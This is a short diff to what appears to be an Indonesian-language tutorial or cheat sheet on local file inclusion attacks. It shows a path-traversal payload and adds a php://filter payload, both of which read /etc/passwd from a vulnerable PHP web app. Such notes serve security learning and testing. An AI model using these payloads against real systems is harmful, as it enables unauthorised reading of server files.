@@ -27,3 +27,9 @@ maka kita perlu untuk memasukkan direktori tersebut ke payload, jadinya
 ```
 http*://webapp.com/index.php?lang=languages/../../../../../etc/passwd
 ```
+
+
+php filter
+```
+http*://webapp.com/index.php?page=php://filter/read=string.rot13/resource=/etc/passwd
+```
